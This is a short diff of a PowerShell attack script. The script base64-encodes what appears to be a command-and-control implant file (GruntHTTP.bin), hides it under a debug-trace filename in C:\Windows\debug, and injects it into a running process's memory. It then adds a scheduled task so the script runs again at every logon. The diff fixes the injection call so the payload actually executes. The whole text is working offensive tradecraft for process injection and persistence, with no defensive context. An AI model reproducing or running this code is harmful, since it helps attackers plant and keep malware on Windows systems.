@@ -11,7 +11,8 @@ $filename = Get-ChildItem -path C:\ -Filter GruntHTTP.bin -Recurse | %{$_.FullNa
 [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Windows\debug\wiatrace.txt
 
 # Inject Payload into Memory
-$processInjection /pid:$procid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
+& $processInjection /pid:$pid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
+
 
 # Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
 schtasks /create /tn "MyCustomTask" /sc onlogon /tr "start /B C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
